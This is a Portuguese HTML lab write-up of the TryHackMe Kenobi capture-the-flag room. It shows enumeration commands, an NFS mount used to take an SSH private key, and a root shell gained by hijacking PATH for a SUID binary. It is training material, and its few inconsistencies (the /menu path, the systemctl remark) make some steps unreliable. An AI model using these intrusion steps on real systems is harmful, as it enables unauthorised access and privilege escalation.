<!DOCTYPE html>
<html lang="pt-BR" class="scroll-smooth">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Relatório de Lab - Kenobi</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gradient-to-br from-[#0D1121] via-[#1a2238] to-[#283655] text-white font-sans min-h-screen relative">
  <!-- Background image decorative -->
  <div class="pointer-events-none fixed inset-0 z-0 flex justify-center items-center">
    <img src="https://image.lexica.art/full_webp/6957307a-3542-4118-ae89-54a02851ef3d" alt="background" class="opacity-30 w-full h-auto hidden md:block" />
  </div>
  <div class="relative z-10 max-w-5xl mx-auto py-12 px-2 md:px-10">
    <!-- Cabeçalho -->
    <header class="mb-10">
      <div class="bg-gradient-to-r from-blue-900 to-blue-600 rounded-xl shadow-lg p-8 flex flex-col items-center relative">
        <h1 class="text-4xl md:text-5xl font-extrabold uppercase tracking-widest text-white drop-shadow-lg mb-2">Kenobi</h1>
        <p class="text-green-100 text-lg">Relatório de Lab <a href="https://tryhackme.com/room/kenobi" class="text-green-600 hover:underline" target="_blank">Kenobi</a></p>
        <p class="mt-2 text-sm text-green-50">Data: <span class="font-semibold">Maio de 2024</span></p>
        <div class="center mt-6">
          <a href="../index.html" class="inline-block bg-gradient-to-r from-green-500 to-green-400 text-white font-bold py-2 px-6 rounded-lg shadow hover:from-green-600 hover:to-green-500 transition text-base">← Voltar aos Labs</a>
        </div>
      </div>
    </header>

    <!-- Sumário -->
    <nav class="mb-12">
      <div class="bg-white rounded-xl shadow border border-blue-100 overflow-hidden">
        <div class="flex items-center bg-gradient-to-r from-blue-900 to-blue-700 px-10 py-6">
          <svg class="w-8 h-8 text-blue-300 mr-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M4 6h16M4 12h16M4 18h16"></path></svg>
          <h2 class="text-3xl font-bold text-white tracking-wide">Sumário</h2>
        </div>
        <ul class="divide-y divide-blue-100">
          <li>
            <a href="#introducao" class="flex items-center px-10 py-4 group hover:bg-blue-50 transition">
              <span class="w-3 h-3 rounded-full bg-blue-500 mr-4 group-hover:bg-blue-700 transition"></span>
              <span class="text-blue-900 text-lg font-medium group-hover:text-blue-700 transition">Introdução</span>
            </a>
          </li>
          <li>
            <a href="#cenario" class="flex items-center px-10 py-4 group hover:bg-blue-50 transition">
              <span class="w-3 h-3 rounded-full bg-blue-500 mr-4 group-hover:bg-blue-700 transition"></span>
              <span class="text-blue-900 text-lg font-medium group-hover:text-blue-700 transition">Cenário do Lab</span>
            </a>
          </li>
          <li>
            <a href="#enumeracao" class="flex items-center px-10 py-4 group hover:bg-blue-50 transition">
              <span class="w-3 h-3 rounded-full bg-blue-500 mr-4 group-hover:bg-blue-700 transition"></span>
              <span class="text-blue-900 text-lg font-medium group-hover:text-blue-700 transition">Enumeração de Serviços e Compartilhamentos</span>
            </a>
          </li>
          <li>
            <a href="#acesso" class="flex items-center px-10 py-4 group hover:bg-blue-50 transition">
              <span class="w-3 h-3 rounded-full bg-blue-500 mr-4 group-hover:bg-blue-700 transition"></span>
              <span class="text-blue-900 text-lg font-medium group-hover:text-blue-700 transition">Acesso Inicial e Exploração</span>
            </a>
          </li>
          <li>
            <a href="#escalada" class="flex items-center px-10 py-4 group hover:bg-blue-50 transition">
              <span class="w-3 h-3 rounded-full bg-blue-500 mr-4 group-hover:bg-blue-700 transition"></span>
              <span class="text-blue-900 text-lg font-medium group-hover:text-blue-700 transition">Escalada de Privilégios</span>
            </a>
          </li>
          <li>
            <a href="#conclusao" class="flex items-center px-10 py-4 group hover:bg-blue-50 transition">
              <span class="w-3 h-3 rounded-full bg-blue-500 mr-4 group-hover:bg-blue-700 transition"></span>
              <span class="text-blue-900 text-lg font-medium group-hover:text-blue-700 transition">Conclusão e Aprendizados</span>
            </a>
          </li>
        </ul>
      </div>
    </nav>

    <!-- Introdução -->
    <section class="mb-12" id="introducao">
      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
        <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
          <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
          Introdução
        </h2>
        <p class="text-gray-800 mb-4 text-lg">
          O laboratório <strong>Kenobi</strong> do TryHackMe simula um ambiente Linux vulnerável, focando em técnicas de enumeração de serviços, exploração de compartilhamentos Samba/NFS, análise de serviços FTP e escalada de privilégios. O objetivo é obter acesso root, passando por diferentes etapas de exploração e raciocínio lógico.
        </p>
        <p class="text-gray-800 mb-4 text-lg">
          Este relatório detalha cada fase do processo, explicando comandos, ferramentas e decisões tomadas para alcançar o objetivo final.
        </p>
      </div>
    </section>

    <!-- Cenário do Lab -->
    <section class="mb-12" id="cenario">
      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
        <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
          <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
          Cenário do Lab
        </h2>
        <ul class="list-disc pl-6 text-gray-800 text-lg space-y-2">
          <li>Ambiente Linux com múltiplos serviços expostos (Samba, NFS, FTP).</li>
          <li>Exploração de compartilhamentos e serviços mal configurados.</li>
          <li>Escalada de privilégios via manipulação de PATH e binários SUID.</li>
          <li>Coleta de flags do usuário e do root.</li>
        </ul>
      </div>
    </section>

    <!-- Enumeração de Serviços e Compartilhamentos -->
    <section class="mb-12" id="enumeracao">
      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
        <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
          <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
          Enumeração de Serviços e Compartilhamentos
        </h2>
        <p class="text-gray-800 mb-4 text-lg">
          O primeiro passo é identificar serviços expostos e compartilhamentos de arquivos. Utilizamos o <strong>nmap</strong> com scripts específicos para Samba:
        </p>
        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP
        </pre>
        <p class="text-gray-800 mb-4 text-lg">
          O resultado revela diversos compartilhamentos disponíveis, incluindo o compartilhamento <span class="font-mono bg-gray-100 px-1 rounded">anonymous</span>.
        </p>
        <img src="../images/images-kenobi/image.png" alt="Nmap Samba" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
        <img src="../images/images-kenobi/image 1.png" alt="Nmap Samba 2" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
        <p class="text-gray-800 mb-4 text-lg">
          Em seguida, conectamos ao compartilhamento identificado utilizando o <strong>smbclient</strong>:
        </p>
        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
smbclient //MACHINE_IP/anonymous
        </pre>
        <p class="text-gray-800 mb-4 text-lg">
          Após conectar, um simples <span class="font-mono bg-gray-100 px-1 rounded">ls</span> revela arquivos disponíveis para leitura.
        </p>
        <img src="../images/images-kenobi/image 2.png" alt="smbclient ls" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
        <p class="text-gray-800 mb-4 text-lg">
          Para identificar montagens NFS, utilizamos novamente o <strong>nmap</strong> com scripts voltados para NFS:
        </p>
        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount MACHINE_IP
        </pre>
        <p class="text-gray-800 mb-4 text-lg">
          O resultado mostra que um diretório está disponível para montagem via NFS.
        </p>
        <img src="../images/images-kenobi/image 3.png" alt="Nmap NFS" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
      </div>
    </section>

    <!-- Acesso Inicial e Exploração -->
    <section class="mb-12" id="acesso">
      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
        <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
          <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
          Acesso Inicial e Exploração
        </h2>
        <p class="text-gray-800 mb-4 text-lg">
          Com os compartilhamentos identificados, buscamos vulnerabilidades em outros serviços. Utilizando <strong>netcat</strong> para conectar à porta FTP e identificar a versão do ProFTPd:
        </p>
        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
nc MACHINE_IP 21
        </pre>
        <img src="../images/images-kenobi/image 4.png" alt="ProFTPd version" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
        <p class="text-gray-800 mb-4 text-lg">
          Com a versão identificada, buscamos exploits conhecidos usando o <strong>searchsploit</strong>:
        </p>
        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
searchsploit proftpd versão
        </pre>
        <img src="../images/images-kenobi/image 5.png" alt="searchsploit proftpd" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
        <p class="text-gray-800 mb-4 text-lg">
          Baseado no exploit do módulo <span class="font-mono bg-gray-100 px-1 rounded">mod_copy</span>, conseguimos copiar a chave privada SSH para o diretório montado via NFS.
        </p>
        <p class="text-gray-800 mb-4 text-lg">
          Montamos o diretório NFS localmente e copiamos a chave privada:
        </p>
        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
sudo mkdir /mnt/kenobiNFS
sudo mount MACHINE_IP:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS

cp /mnt/kenobiNFS/tmp/id_rsa .
sudo chmod 600 id_rsa
ssh -i id_rsa kenobi@MACHINE_IP
ls
        </pre>
        <img src="../images/images-kenobi/image 6.png" alt="SSH acesso user" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
        <p class="text-gray-800 mb-4 text-lg">
          Agora temos acesso ao usuário <strong>kenobi</strong> via SSH e podemos acessar o arquivo <span class="font-mono bg-gray-100 px-1 rounded">user.txt</span> contendo a primeira flag.
        </p>
      </div>
    </section>

    <!-- Escalada de Privilégios -->
    <section class="mb-12" id="escalada">
      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-800">
        <h2 class="text-3xl font-bold text-cyan-900 mb-5 flex items-center gap-2">
          <svg class="w-7 h-7 text-cyan-800" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
          Escalada de Privilégios
        </h2>
        <p class="text-gray-800 mb-4 text-lg">
          Para obter acesso root, iniciamos a busca por arquivos SUID, que podem ser explorados para escalada de privilégios:
        </p>
        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
find / -perm -u=s -type f 2>/dev/null
        </pre>
        <img src="../images/images-kenobi/image 7.png" alt="find suid" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
        <p class="text-gray-800 mb-4 text-lg">
          Encontramos um binário incomum chamado <span class="font-mono bg-gray-100 px-1 rounded">/menu</span>. Ao executá-lo, são apresentadas opções de menu.
        </p>
        <img src="../images/images-kenobi/image 8.png" alt="menu binário" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
        <p class="text-gray-800 mb-4 text-lg">
          Aparentemente o binário utiliza o comando <span class="font-mono bg-gray-100 px-1 rounded">curl</span> sem especificar o caminho absoluto, permitindo manipulação da variável <span class="font-mono bg-gray-100 px-1 rounded">PATH</span>. Para explorar:
        </p>
        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
        </pre>
        <p class="text-gray-800 mb-4 text-lg">
          Ao selecionar a opção que executa <span class="font-mono bg-gray-100 px-1 rounded">curl</span>, nosso script é executado como root, abrindo um shell privilegiado. Assim, podemos acessar o diretório <span class="font-mono bg-gray-100 px-1 rounded">/root</span> e ler a flag final:
        </p>
        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
cd /root
cat root.txt
        </pre>
        <img src="../images/images-kenobi/image 9.png" alt="root flag" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
      </div>
    </section>

    <!-- Conclusão e Aprendizados -->
    <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700" id="conclusao">
      <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
        <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
        Conclusão e Aprendizados
      </h2>
      <ul class="list-disc pl-6 space-y-2 text-lg">
        <li class="text-gray-800">A enumeração detalhada de serviços e compartilhamentos é fundamental para identificar vetores de ataque.</li>
        <li class="text-gray-800">A exploração de serviços mal configurados, como Samba, NFS e FTP, pode fornecer acesso inicial ao sistema.</li>
        <li class="text-gray-800">A manipulação da variável PATH e análise de binários SUID são técnicas clássicas de escalada de privilégios.</li>
        <li class="text-gray-800">O uso de systemctl para criar serviços temporários pode ser explorado caso não haja restrições adequadas.</li>
        <li class="text-gray-800">A prática reforça a importância de hardening em ambientes Linux e monitoramento constante de permissões e serviços.</li>
      </ul>
      <p class="text-gray-800 mt-6 text-lg">
        O lab Kenobi é excelente para consolidar conhecimentos em enumeração, exploração de serviços e técnicas de pós-exploração em sistemas Linux.
      </p>
    </div>

    <!-- Botão de Voltar -->
    <div class="text-center mt-12">
      <a href="../index.html" class="inline-block bg-gradient-to-r from-green-500 to-green-400 text-white font-bold py-3 px-8 rounded-lg shadow hover:from-green-600 hover:to-green-500 transition text-lg">← Voltar aos Labs</a>
    </div>
  </div>
</body>
</html>